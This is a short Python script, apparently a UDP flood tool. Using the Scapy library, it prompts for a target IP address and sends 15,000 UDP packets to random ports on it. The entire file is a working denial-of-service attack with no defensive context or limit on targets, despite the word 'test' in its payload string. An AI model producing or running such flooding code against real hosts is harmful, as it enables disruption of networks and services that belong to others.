import sys
from scapy.all import *

targetIP = raw_input("Target IP Address: ")

send (IP(dst=targetIP)/UDP(dport=RandShort())/"UDP_FLOOD_test", count = 15000)
